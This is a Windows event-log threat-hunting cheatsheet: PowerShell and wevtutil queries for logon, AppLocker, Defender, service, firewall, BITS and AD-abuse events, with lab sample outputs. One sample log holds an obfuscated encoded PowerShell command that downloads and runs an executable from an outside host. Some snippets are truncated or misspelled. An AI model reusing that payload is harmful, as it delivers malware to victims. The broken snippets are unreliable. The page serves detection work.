---
layout: post
title: sys / win / logs
category: sys
parent: cheatsheets
modified_date: 2024-11-18
permalink: /sys/win/logs
---

**MENU**

<!-- vscode-markdown-toc -->
* [wow-sources](#wow-sources)
* [providers](#providers)
* [account](#account)
	* [logon-interactive](#logon-interactive)
	* [logon-network](#logon-network)
	* [logon-rdp](#logon-rdp)
	* [logon-runas](#logon-runas)
	* [account-changes](#account-changes)
* [executions](#executions)
	* [applocker](#applocker)
	* [defender](#defender)
	* [powershell](#powershell)
	* [scheduled-tasks](#scheduled-tasks)
	* [services](#services)
	* [sysmon](#sysmon)
* [filesystem-io](#filesystem-io)
	* [fs-io](#fs-io)
	* [fs-io-usb](#fs-io-usb)
	* [fs-io-registry](#fs-io-registry)
* [logs](#logs)
  	* [activate-amsi-logs](#activate-amsi-logs)
	* [activate-dns-debug-logs](#activate-dns-debug-logs)
	* [activate-firewall-logs](#activate-firewall-logs)
	* [activate-firewall-logs-managed](#activate-firewall-logs-managed)
 	* [tampering-logs](#tampering-logs) 
* [network](#network)
  	* [firewall](#firewall)	
	* [net-bits](#net-bits)	
	* [net-rdp](#net-rdp)
	* [net-share](#net-share)
	* [net-smb](#net-smb)
   	* [net-winrm](#net-winrm)
	* [sysmon](#sysmon)
	* [vpn-anyconnect](#vpn-anyconnect)
* [ad](#ad)
	* [ad-abuse-of-delegation](#ad-abuse-of-delegation)
	* [ad-ds-replication](#ad-ds-replication)
	* [windows-defender](#windows-defender)
	* [logs-tampering](#logs-tampering)
	* [email-compromise](#email-compromise)
* [extras](#extras)
	* [artifacts](#artifacts)
	* [MindMap for Windows OS](#MindMapforWindowsOS)
	* [MindMap for MS Active Directory](#MindMapforMSActiveDirectory)
	* [MindMap for MS Exchange](#MindMapforMSExchange)
	* [MindMap for other MS Server Roles](#MindMapforotherMSServerRoles)
	* [MindMap for MS Azure](#MindMapforMSAzure)
	* [Fetching into the logs with PS](#FetchingintothelogswithPS)
	* [Formating TSV to CSV](#FormatingTSVtoCSV)
	* [Formatting the MFT entries to CSV](#FormattingtheMFTentriestoCSV)

<!-- vscode-markdown-toc-config
	numbering=false
	autoSave=true
	/vscode-markdown-toc-config -->
<!-- /vscode-markdown-toc -->

## <a name='wow-sources'></a>wow-sources

[SANS | working-with-the-event-log-part-1](https://www.sans.org/blog/working-with-the-event-log-part-1)
[SANS | working-with-the-event-log-part-2](https://www.sans.org/blog/working-with-event-log-part-2-threat-hunting-with-event-logs/)
[SANS | working-with-the-event-log-part-3](https://www.sans.org/blog/working-with-the-event-log-part-3-accessing-message-elements/)
[SANS | working-with-the-event-log-part-4](https://www.sans.org/blog/working-with-the-event-log-part-4-tweaking-event-log-settings/)

| Reference | Description |
|-----------|-------------|
| [UWS securitylog encyclopedia](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/default.aspx) | Full Security logs listing (format, fields, values). |
| [UWS securitylog cheatsheet](https://github.com/jomivz/cybrary/blob/master/uws_securitylog_cheatsheet.pdf) | authentication, users and groups changes. |
| [EHM classified events](https://www.eyehatemalwares.com/incident-response/eventlog-analysis/) | Account, Process & PS exec, Files access, Network share, Service, Scheduled tasks, FW, Applocker, Audit log, USB, Registry. |
| [mdecrevoisier mindmap](/assets/images/for-win-logs-auditing-baseline-map.png) | 🔥 Full classification (DLL load, code integrity, windows updates, GPO, bitlocker and all classics! | 

## <a name='providers'></a>providers
```powershell
# listing categories sort descending by recordcount
Get-WinEvent -ListLog * | Where-Object {$_.RecordCount -gt 0} | Select-Object LogName, RecordCount, IsClassicLog, IsEnabled, LogMode, LogType | Sort-Object -Descending -Property RecordCount | FT -autosize

# recent entries of security logs
# Get-EventLog -LogName Security -Newest 5
$secevt = Get-WinEvent @{logname='security'} -MaxEvents 10
$secevt = Get-WinEvent @{logname='Microsoft-Windows-Windows Defender/Operational'} -MaxEvents 10

$secevt = Get-WinEvent @{logname='Microsoft-Windows-WinRM/Operational'} -MaxEvents 10
$secevt = Get-WinEvent @{logname='Microsoft-Windows-WMI-Activity/Operational'} -MaxEvents 10
$secevt = Get-WinEvent @{logname='Microsoft-Windows-WMI-Activity/Operational'} -MaxEvents 10
```

## <a name='account'></a>account

![winevent_accounts](/assets/images/win_20_audit_events4_accounts.jpg)

```powershell
#TO DEBUG
cd C:\Windows\SysWOW64
$date1=([datetime]"2/25/2024")
$date2=([datetime]"2/26/2024")
$XPATH=(*[System[TimeCreated[@SystemTime >= '%FROM%' and @SystemTime < '%TO%'] and System[(EventID='4624')] and (EventData[Data[@Name='LogonType'] and (Data='2' or Data='7' or Data='10' or Data='11')]) and (EventData[Data[@Name='WorkstationName'] and (Data='DC01')]) and (EventData[Data[@Name='LogonProcessName'] and (Data='User32 ')])])
./wevtutil.exe qe Security /c:30 /rd:true /f:xml /e:root /q:"%XPATH%"
./wevtutil.exe qe Security /q:"%XPATH%" /c:30 /rd:true /f:xml /e:Events


./wevtutil.exe qe Security "/q:*[System[TimeCreated[timediff(@SystemTime) <= 5184000000]]  /c:1 /rd:true /f:xml /e:Events

./wevtutil.exe qe Security "/q:*[System[TimeCreated[timediff(@SystemTime) <= 5184000000]] and System[(EventID='4624')] and (EventData[Data[@Name='LogonType'] and (Data='2' or Data='7' or Data='10' or Data='11')]) and (EventData[Data[@Name='WorkstationName'] and (Data='DC01')]) and (EventData[Data[@Name='LogonProcessName'] and (Data='User32 ')])]" /c:1 /rd:true /f:xml /e:Events
```

### <a name='logon-interactive'></a>logon-interactive
```powershell
# 'C:\Windows\System32\winevt\logs\Security.evtx'
$xpath = "*[System[(EventID=4624)]] and *[EventData[Data[@Name='TargetUserName']!='SYSTEM']]]"
Get-WinEvent -MaxEvents 1000 -FilterXPath $xpath -Path '.\Security.evtx' | Foreach-Object {
    $xml = [xml]$_.ToXml()
    $hash = [ordered]@{ 'TimeCreated' = $xml.Event.System.TimeCreated.SystemTime }
    $xml.Event.EventData.Data | where Name -in 'TargetUserName','WorkStationName','LogonType' | Foreach-Object {
    	$hash[$_.Name] = $_.'#text'
    }
    [pscustomobject]$hash
}

$xpath = "*[System[(EventID=4624)]] and *[EventData[Data[@Name='TargetUserName']!='SYSTEM'] and TimeCreated[timediff(@SystemTime) <= 300000]]]"
Get-WinEvent -MaxEvents 1000 -FilterXPath $xpath -Path 'C:\Windows\System32\winevt\logs\Security.evtx' |
# Where-Object { ($_.TimeCreated.AddTicks(-$_.TimeCreated.Ticks % [timespan]::TicksPerSecond)) -eq $time } | Foreach-Object { 
Where-Object {$_.TimeCreated -gt $date1 -and $_.TimeCreated -lt $date2} | Foreach-Object {
    $xml = [xml]$_.ToXml()
    $hash = [ordered]@{ 'TimeCreated' = $xml.Event.System.TimeCreated.SystemTime }
    $xml.Event.EventData.Data | where Name -in 'TargetUserName','WorkStationName','LogonType' | Foreach-Object {
    	$hash[$_.Name] = $_.'#text'
    }
    [pscustomobject]$hash
}
```

### <a name='logon-network'></a>logon-network
```powershell
$xpath = "*[System[(EventID=4624)]] and *[EventData[Data[@Name='TargetUserName']!='SYSTEM']] and *[EventData[Data[@Name='LogonType']='3']]"
Get-WinEvent -MaxEvents 1000 -FilterXPath $xpath -Path '.\Security.evtx' | Foreach-Object {
    $xml = [xml]$_.ToXml()
    $hash = [ordered]@{ 'TimeCreated' = $xml.Event.System.TimeCreated.SystemTime }
    $xml.Event.EventData.Data | where Name -in 'TargetUserName','LogonType','IPAddress' | Foreach-Object {
    	$hash[$_.Name] = $_.'#text'
    }
    [pscustomobject]$hash
}
```

### <a name='logon-rdp'></a>logon-rdp
```powershell
# EventID 1149: Remote Desktop Services: User authentication succeeded
# Eventvwr.msc > Applications and Services Logs -> Microsoft -> Windows -> Terminal-Services-RemoteConnectionManager > Operational
$RDPAuths = Get-WinEvent -LogName 'Microsoft-Windows-TerminalServices-RemoteConnectionManager/Operational' -FilterXPath '<QueryList><Query Id="0"><Select>*[System[EventID=1149]]</Select></Query></QueryList>'
[xml[]]$xml=$RDPAuths|Foreach{$_.ToXml()}
$EventData = Foreach ($event in $xml.Event)
{ New-Object PSObject -Property @{
TimeCreated = (Get-Date ($event.System.TimeCreated.SystemTime) -Format 'yyyy-MM-dd hh:mm:ss K')
User = $event.UserData.EventXML.Param1
Domain = $event.UserData.EventXML.Param2
Client = $event.UserData.EventXML.Param3
}
} $EventData | FT
```

### <a name='logon-runas'></a>logon-runas
```powershell
```

### <a name='accountchanges'></a>account-changes

![windows_account_changes](/assets/images/sys-win-logs-account-changes.png)
![windows_group_changes](/assets/images/sys-win-logs-account-changes-groups.png)

```powershell
# 4720 | account created
Get-WinEvent -FilterHashtable @{ LogName='Security'; ID=4720 }  | Format-List -Property TimeCreated, Message


TimeCreated : 7/13/2022 11:08:48 AM
Message     : A user account was created.

              Subject:
                Security ID:            S-1-5-21-2977773840-2930198165-1551093962-1000
                Account Name:           Sec504
                Account Domain:         SEC504STUDENT
                Logon ID:               0x74530

              New Account:
                Security ID:            S-1-5-21-2977773840-2930198165-1551093962-1315
                Account Name:           assetmgr
                Account Domain:         SEC504STUDENT

              Attributes:
                SAM Account Name:       assetmgr
                Display Name:           <value not set>
                User Principal Name:    -
                Home Directory:         <value not set>
                Home Drive:             <value not set>
                Script Path:            <value not set>
                Profile Path:           <value not set>
                User Workstations:      <value not set>
                Password Last Set:      <never>
                Account Expires:                <never>
                Primary Group ID:       513
                Allowed To Delegate To: -
                Old UAC Value:          0x0
                New UAC Value:          0x15
                User Account Control:
                        Account Disabled
                        'Password Not Required' - Enabled
                        'Normal Account' - Enabled
                User Parameters:        <value not set>
                SID History:            -
                Logon Hours:            All

              Additional Information:
                Privileges              -
```

## <a name='executions'></a>executions

![windows log for process executions](/assets/images/for-win-logs-proc-exec.png)

### <a name='applocker'></a>applocker
```powershell
# EXE and DLL | applocker denied
Get-WinEvent -FilterHashtable @{ LogName='Microsoft-Windows-AppLocker/EXE and DLL'; Id=8004 } | Format-List -Property TimeCreated,Message

TimeCreated : 7/12/2022 12:36:06 PM
Message     : %OSDRIVE%\USERS\SEC504\APPDATA\LOCAL\TEMP\CALCACHE.EXE was prevented from running.

TimeCreated : 7/12/2022 11:37:45 AM
Message     : %OSDRIVE%\TOOLS\SHARPVIEW.EXE was prevented from running.

TimeCreated : 7/12/2022 11:37:45 AM
Message     : %OSDRIVE%\TOOLS\SHARPVIEW.EXE was prevented from running.

# WMI and Script
$secevt = Get-WinEvent @{logname='Microsoft-Windows-AppLocker/WMI and Script'} -MaxEvents 10
```

### <a name='defender'></a>defender
[windows defender](https://docs.microsoft.com/en-us/microsoft-365/security/defender-endpoint/troubleshoot-microsoft-defender-antivirus?view=o365-worldwide) logs

- EID 1006 :
```powershell
$date1 = [datetime]"11/08/2021"
$date2 = get-date "08/17/2021"
Get-WinEvent –FilterHashtable @{'logname'='application'; 'id'=1006} |
Where-Object {$_.TimeCreated -gt $date1 -and $_.timecreated -lt $date2} | out-gridview
```

- EID 1116 / 1117 :
```powershell
# Windows-Windows Defender # 1116 # detection
$secevt = Get-WinEvent @{logname='Microsoft-Windows-Windows Defender/Operational';id='1116'} | fl * 

# Windows-Windows Defender # 1117 # protection
$secevt = Get-WinEvent @{logname='Microsoft-Windows-Windows Defender/Operational';id='1117'} | fl *
```
![windows log defender_1116](/assets/images/sys-win-logs-exe-defender-1116.png)

- Output in Format Table :
```powershell
# Windows-Windows Defender # XML parsing
$secevt | Foreach-Object {
    $xml = [xml]$_.ToXml()
    $hash = [ordered]@{ 'TimeCreated' = $xml.Event.System.TimeCreated.SystemTime }
    $xml.Event.EventData.Data | where Name -in 'Threat Name','Process Name','Detection User','Path' | Foreach-Object {
    	$hash[$_.Name] = $_.'#text'
    }
    [pscustomobject]$hash
} | ft *
```
![windows log defender_1116](/assets/images/sys-win-logs-exe-defender-1116_ft.png)

### <a name='powershell'></a>powershell
```powershell
# base64 encoded commands 
Get-WinEvent -FilterHashtable @{ LogName='Microsoft-Windows-PowerShell/Operational'; Id='4104';} | Where-object -Property Message -Match "[A-Za-z0-9+/=]{200}" | Format-List -Property Message

Message : Creating Scriptblock text (1 of 1):
          poWERShElL.Exe -ExECutioNPolicy bYpAsS -NOPrOFiLe -WindOwsTyLe HiddEN -enCodEdCoMMANd IAAoAG4ARQB3AC0AbwBiAGoAZQB
          jAFQAIABTAHkAUwBUAGUAbQAuAE4AZQB0AC4AVwBFAGIAQwBsAGkARQBOAHQAKQAuAEQAbwB3AE4ATABvAGEARABGAEkAbABFACgAIAAdIGgAdAB0
          AHAAcwA6AC8ALwBhAHIAaQBoAGEAbgB0AHQAcgBhAGQAZQByAHMAbgBnAHAALgBjAG8AbQAvAGkAbQBhAGcAZQBzAC8AUwBjAGEAbgBfADIALgBlA
          HgAZQAdICAALAAgAB0gJABlAG4AdgA6AFQARQBtAFAAXABvAHUAdABwAHUAdAAuAGUAeABlAB0gIAApACAAOwAgAGkAbgBWAG8AawBFAC0ARQB4AF
          AAUgBlAHMAUwBJAG8ATgAgAB0gJABFAE4AdgA6AHQARQBNAFAAXABvAHUAdABwAHUAdAAuAGUAeABlAB0g

          ScriptBlock ID: 9998ff14-4851-45e4-8aca-8b08753a2f42
          Path:

# catch PowerView 
Get-WinEvent -FilterHashtable @{ LogName='Microsoft-Windows-PowerShell/Operational'; Id='4104';} | Where-object -Property Message -Match "dcsync" | Select-Obecjt -First 1 | FL *
```

### <a name='scheduled-tasks'></a>scheduled-tasks
```powershell
```

### <a name='services'></a>services

![winevent_services](/assets/images/win_20_audit_events5_svcs.jpg)

```powershell
Get-WinEvent -FilterHashtable @{ LogName='System'; Id='7045';} | Format-List TimeCreated,Message

TimeCreated : 7/12/2022 12:36:06 PM
Message     : A service was installed in the system.

              Service Name:  Dynamics
              Service File Name:  C:\Tools\nssm.exe
              Service Type:  user mode service
              Service Start Type:  auto start
              Service Account:  LocalSystem
```

### <a name='sysmon'></a>sysmon
```powershell
```

## <a name='filesystem-io'></a>filesystem-io

### <a name='fs-io'></a>fs-io
```powershell
```

### <a name='fs-io-registry'></a>fs-io-registry
```powershell
```

### <a name='fs-io-usb'></a>fs-io-usb
```powershell
```

## <a name='logs'></a>logs

### <a name='activate-amsi-logs'></a>activate-amsi-logs
```powershell
$AutoLoggerName = 'MyAMSILogger'
$AutoLoggerGuid = "{$((New-Guid).Guid)}"
New-AutologgerConfig -Name $AutoLoggerName -Guid $AutoLoggerGuid -Start Enabled
Add-EtwTraceProvider -AutologgerName $AutoLoggerName -Guid '{2A576B87-09A7-520E-C21A-4942F0271D67}' -Level 0xff -MatchAnyKeyword ([UInt64] (0x8000000000000001 -band ([UInt64]::MaxValue))) -Property 0x41
```

### <a name='activate-dns-debug-logs'></a>activate-dns-debug-logs
```
# Default path:
#  - %SystemRoot%\System32\Winevt\Logs\Microsoft-Windows-DNSServer%4Analytical.etl
#  - %SystemRoot%\System32\Dns\Dns.log

# Enable DNS : check the parameter `dwDebugLevel`. It value must be `00006101`.
dnscmd /Info

# Enable DNS : verify log file location
reg query HKLM\System\CurrentControlSet\Services\DNS\Parameters
Get-ChildItem -Path HKLM:\System\CurrentControlSet\Services\DNS

# Enable DNS : set the debug mode + log file location
dnscmd.exe localhost /Config /LogLevel 0x6101
dnscmd.exe localhost /Config /LogFilePath "C:\Windows\System32\DNS\dns.log"
```

### <a name='activate-firewall-logs'></a>activate-firewall-logs
```powershell
# Run this command to check if the logging is enabled
netsh advfirewall show allprofiles

# Run this command to identify: the logging file
netsh advfirewall show allprofiles | Select-String Filename

# Enable the logging on drop for the firewall profiles: {Domain, Public, Private}
Set-NetFirewallProfile -Name Domain -LogBlocked True
Set-NetFirewallProfile -Name Public -LogBlocked True
Set-NetFirewallProfile -Name Private -LogBlocked True

# Check in between the logging status with the first command
# Disable the logging on drop for the firewall profiles: {Domain, Public, Private}
Set-NetFirewallProfile -Name Domain -LogBlocked False

# Confirm %systemroot% is "C:\Windows"
$env:SystemRoot

# Set the logging into a variable
$fwlog = “C:\Windows\system32\LogFiles\Firewall\pfirewall.log”

# Check drop connections 
Select-String -Path $fwlog -Pattern “drop”

# List all the logs
Get-Content c:\windows\system32\LogFiles\Firewall\pfirewall.log
```

### <a name='activate-firewall-logs-managed'></a>activate-firewall-logs-managed 

```powershell
# Prefer the GUID than the subcategory name / avoid OS language issues
auditpol /list /subcategory:* /r > extract.txt

# Grep for the keyword 'Filtering'  
auditpol /set /subcategory:"{0CCE9225-69AE-11D9-BED3-505054503030}" /success:enable /failure:enable
auditpol /set /subcategory:"{0CCE9226-69AE-11D9-BED3-505054503030}" /success:enable /failure:enable
auditpol /set /subcategory:"{0CCE9233-69AE-11D9-BED3-505054503030}" /success:enable /failure:enable
# Check the change was applied
auditpol /get /category:* |find str filtr

# Run as admin
eventvwr.msc
```

- Filter event IDs 5152,5156,5158 :
[Firewall EIDs | 4949 to 4958](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/)

### <a name='tampering-logs'></a>tampering-logs

- [EID 1100](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventid=1100)

```powershell
tbd
```

- [EID 1102](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventid=1102)
- [unprotect - clear windows logs](https://search.unprotect.it/technique/clear-windows-event-logs/)
  
```powershell
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=1102 } | Format-List -Property TimeCreated,Message

TimeCreated : 6/26/2022 10:34:08 AM
Message     : The audit log was cleared.
              Subject:
                Security ID:    S-1-5-21-2977773840-2930198165-1551093962-1000
                Account Name:   Sec504
                Domain Name:    SEC504STUDENT
                Logon ID:       0x1BD38
```
	
## <a name='network'></a>network

![windows log for network connections](/assets/images/for-win-logs-net-conn-1.png)
![windows log for network connections](/assets/images/for-win-logs-net-conn-2.png)

### <a name='firewall'></a>firewall
```powershell
Get-WinEvent -FilterHashtable @{ LogName='Microsoft-Windows-Windows Firewall With Advanced Security/Firewall'; Id=2004,2006 } | Format-List

TimeCreated  : 7/13/2022 12:46:11 AM
ProviderName : Microsoft-Windows-Windows Firewall With Advanced Security
Id           : 2004
Message      : A rule has been added to the Windows Defender Firewall exception list.

               Added Rule:
                Rule ID:        {832669FD-1FAF-426C-872F-8E2B4E41AB2F}
                Rule Name:      ApacheBench command line utility
                Origin: Local
                Active: No
                Direction:      Inbound
                Profiles:       Domain
                Action: Allow
                Application Path:       C:\Tools\calcache.exe
                Service Name:
                Protocol:       UDP
                Security Options:       None
                Edge Traversal: None
                Modifying User: S-1-5-21-2977773840-2930198165-1551093962-1000
                Modifying Application:  C:\Windows\System32\dllhost.exe
```
		
### <a name='net-bits'></a>net-bits
```powershell
Get-WinEvent -FilterHashtable @{ LogName='Microsoft-Windows-Bits-Client/Operational'; Id='59'} | Format-List TimeCreated,Message


TimeCreated : 7/13/2022 1:18:15 AM
Message     : BITS started the C:\Users\Sec504\AppData\Local\Temp\{B3C27651-579B-455E-8B0D-4441DBAECA2C}-103.0.5060.114_102
              .0.5005.115_chrome_updater.exe transfer job that is associated with the http://edgedl.me.gvt1.com/edgedl/rele
              ase2/chrome/acd5g6744td43h2xionzuaxlaheq_103.0.5060.114/103.0.5060.114_102.0.5005.115_chrome_updater.exe URL.

TimeCreated : 7/13/2022 1:15:59 AM
Message     : BITS started the BITS Transfer transfer job that is associated with the
              https://www.willhackforsushi.com/bitfit.exe URL.

TimeCreated : 7/13/2022 1:15:44 AM
Message     : BITS started the Font Download transfer job that is associated with the
              https://fs.microsoft.com/fs/windows/config.json URL.
```
 
### <a name='net-rdp'></a>net-rdp
```powershell
```

### <a name='net-share'></a>net-share

![winevent_shares](/assets/images/win_20_audit_events6_shares.jpg)

```powershell
```
### <a name='net-smb'></a>net-smb
```powershell
```

### <a name='net-winrm'></a>net-winrm
```powershell
```

### <a name='sysmon'></a>sysmon
```powershell
```

### <a name='vpn-anyconnect'></a>vpn-anyconnect
```powershell
# cisco anyconnect
Get-WinEvent -FilterHashtable @{'Logname'='Cisco AnyConnect Secure Mobility Client'} | Group-Object Id -NoElement | sort count
```

## <a name='ad'></a>ad
### <a name='ad-abuse-of-delegation'></a>ad-abuse-of-delegation
```powershell
# hunting for a CD abuse 1: look for theEID 4742, computer object 'AllowedToDelegateTo' set on DC
# hunting for a CD abuse 2
Get-ADObject -Filter {(msDS-AllowedToDelegateTo -like '*') -and (UserAccountControl -band 0x1000000)} -properties samAccountName, ServicePrincipalName, msDs-AllowedDelegateTo, userAccountControl

# hunting for a RBCD abuse 1: pivot on GUID in theEID 4662 (Properties: Write Property) + 5136 (attribute: msDS-AllowedToActOnBehalfOfOtherIdentity)
# hunting for a RBCD abuse 2
Get-ADObject -Filter {(msDS-AllowedToActOnBehalfOfOtherIdentity -like '*')}
Get-ADComputer <ServiceB> -properties * | FT Name, PrincipalsAllowedToDelegateToAccount
```

### <a name='ad-ds-replication'></a>ad-ds-replication

* hunting for DCsync permission added to an account 1: 4662 ('Properties: Control Access') with DS-Replication GUID

| Entry | CN | Display-Name | Rights-GUID |
|----------------|--------------|--------------|-----------------|
| Value | DS-Replication-Get-Changes | Replicating Directory Changes |1131f6aa-9c07-11d1-f79f-00c04fc2dcd2
| Value | DS-Replication-Get-Changes-All | Replicating Directory Changes All |1131f6ad-9c07-11d1-f79f-00c04fc2dcd2

* hunting for DCsync permission added to an account 2
```powershell
(Get-Acl "ad:\dc=DC01,dc=local").Access | where-object {$_.ObjectType -eq "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2" -or $_.objectType -eq 
```

### <a name='email-compromise'></a>email-compromise

- [Microsoft-eventlog-mindmap \ windows-email-compromise-map](https://github.com/mdecrevoisier/Microsoft-eventlog-mindmap/blob/main/windows-auditing-baseline-map/windows-auditing-baseline-map.png)


## <a name='extras'></a>extras

### <a name='artifacts'></a>artifacts

To get the EVTX filenames and paths, go to [jmvwork.xyz/forensics/for-win-artifacts/#EventlogsFiles](https://www.jmvwork.xyz/forensics/for-win-artifacts/#EventlogsFiles).

To count the logs / EID, use the commands below:
```powershell
# count the security logs per ID
# Path: 
Get-WinEvent -Path 'C:\Windows\System32\winevt\logs\Security.evtx' | Group-Object id -NoElement | Sort-Object count 

# count the security logs of day per ID
# logname: Security, Application, System, Windows Powershell,...
Get-Winevent -FilterHashtable @{logname='Security’; starttime=(get-date).date} | Group-Object id -NoElement | Sort-Object count

# count the security logs per ID
Get-WinEvent -Path 'C:\Windows\System32\winevt\logs\Security.evtx' | Group-Object id -NoElement | Sort-Object count 
```

### <a name='MindMapforWindowsOS'></a>MindMap for Windows OS

- [Microsoft-eventlog-mindmap \ windows-auditing-baseline-map](https://github.com/mdecrevoisier/Microsoft-eventlog-mindmap/blob/main/windows-auditing-baseline-map/windows-auditing-baseline-map.png)

### <a name='MindMapforMSActiveDirectory'></a>MindMap for MS Active Directory 

- [Microsoft-eventlog-mindmap \ active-diretory-map](https://github.com/mdecrevoisier/Microsoft-eventlog-mindmap/blob/main/active-directory-map/active-directory-map.png)

### <a name='MindMapforMSExchange'></a>MindMap for MS Exchange

- [Microsoft-eventlog-mindmap \ windows-auditing-baseline-map](https://github.com/mdecrevoisier/Microsoft-eventlog-mindmap/blob/main/exchange-server-map/exchange-server-map.png)

### <a name='MindMapforotherMSServerRoles'></a>MindMap for other MS Server Roles

- [Microsoft-eventlog-mindmap \ windows-auditing-baseline-map](https://github.com/mdecrevoisier/Microsoft-eventlog-mindmap/blob/main/windows-server-roles-map/windows-server-roles-map.png)

### <a name='MindMapforMSAzure'></a>MindMap for MS Azure

- [Microsoft-eventlog-mindmap \ microsoft-azure-map](https://github.com/mdecrevoisier/Microsoft-eventlog-mindmap/blob/main/microsoft-azure-map/microsoft-azure-map.png)

### <a name='FetchingintothelogswithPS'></a>Fetching into the logs with PS

```powershell

# list the evtx files not empty
Get-WinEvent -ListLog * | Where-Object {$_.RecordCount -gt 0}
dir $env:systemroot"\System32\winevt\logs" | Sort-Object -Descending -Property LastWriteTime

# get the first and the last security log
Get-WinEvent -Path $env:systemroot"\System32\winevt\logs\Security.evtx" -MaxEvents 1
Get-WinEvent -Path $env:systemroot"\System32\winevt\logs\Security.evtx" -Oldest -MaxEvents 1

# get last 24h powershell logs
$Yesterday = (Get-Date) - (New-TimeSpan -Day 1)
Get-WinEvent -LogName 'Windows PowerShell' | Where-Object { $_.TimeCreated -ge $Yesterday }

# filter security logs on eventId 4905
Get-WinEvent -FilterHashtable @{Path=$env:systemroot+'\System32\winevt\logs\Security.evtx';ID=4905}

# list events over a time period 
$date1 = [datetime]"4/27/2018"
$date2 = [datetime]"4/28/2018"
$a = [DateTime] "07/06/2022 05:00 AM"
Get-WinEvent –FilterHashtable @{logname=’application’; level=1,2,3} -ComputerName server01 | 
Where-Object {$_.TimeCreated -gt $date1 -and $_.timecreated -lt $date2} | out-gridview

# list Group Policy events
(Get-WinEvent -ListProvider Microsoft-Windows-GroupPolicy).Events | Format-Table Id, Description

# list application events related to iexplore.exe 
$StartTime = (Get-Date).AddDays(-7)
Get-WinEvent -FilterHashtable @{
  Logname='Application'
  ProviderName='Application Error'
  Data='iexplore.exe'
  StartTime=$StartTime
}

# list interactive logon
Get-winevent -FilterHashtable @{logname='security'; id=4624; starttime=(get-date).date} | where {$_.properties[8].value -eq 2}

# get eventdata properties
$events = Get-WinEvent -FilterHashtable @{ProviderName="Microsoft-Windows-Security-Auditing"; id=4624}
$event = [xml]$events[0].ToXml()
$event.Event.EventData.Data
$event.Event.EventData.Data | Where-Object {$_.name -eq "BootStartTime"}
$BootStartTime."#text"

```

### <a name='FormatingTSVtoCSV'></a>Formating TSV to CSV
```sh
# TSV logs to CSV
# First aims to deal with empty fields
sed 's\t\t/,,/' sourcelog.tsv > sourcelog2.tsv
sed 's\t\+/,/g' sourcelog2.tsv > formatted_sourcelog.csv

# Windows EVTX logs to XML
evtx_dump.py Security.evtx > security.xml
 
```

### <a name='FormattingtheMFTentriestoCSV'></a>Formatting the MFT entries to CSV
```sh
python3.6 vol.py -f memdump.img filescan | grep mft > filescan_mft.txt
cat filescan_mft.txt
0xc70a84d9f21
python3.6 vol.py -f memdump.img dumpfile --physaddr 0xc70a84d9f21 > mft.vacb
analyzeMFT.py -f mft.vacb -e -c mft.vacb.csv
```
